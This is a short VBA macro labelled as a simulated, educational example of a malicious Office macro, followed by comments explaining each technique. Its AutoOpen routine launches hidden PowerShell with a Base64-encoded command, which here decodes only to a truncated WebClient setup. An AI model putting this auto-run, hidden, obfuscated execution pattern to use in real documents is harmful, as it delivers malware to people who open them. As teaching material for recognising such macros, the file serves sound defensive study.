' Simulated VBA Macro - Educational purposes only
' This demonstrates how malicious macros typically look
' No actual malicious payload is included

Sub AutoOpen()
    Dim objShell As Object
    Dim strCmd As String
    
    ' Stage 1: Create Shell object
    Set objShell = CreateObject("WScript.Shell")
    
    ' Stage 2: Execute PowerShell with download cradle (SIMULATED - URL is fake)
    strCmd = "powershell.exe -nop -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=="
    
    ' Stage 3: Run hidden
    objShell.Run strCmd, 0, False
    
    ' Stage 4: Clean up
    Set objShell = Nothing
End Sub

' Pattern analysis:
' - AutoOpen() fires when document is opened
' - Creates WScript.Shell for process execution
' - Launches PowerShell with -enc (Base64 obfuscation)
' - -nop = no profile, -w hidden = invisible window
' - 0 = WindowStyle hidden, False = don't wait
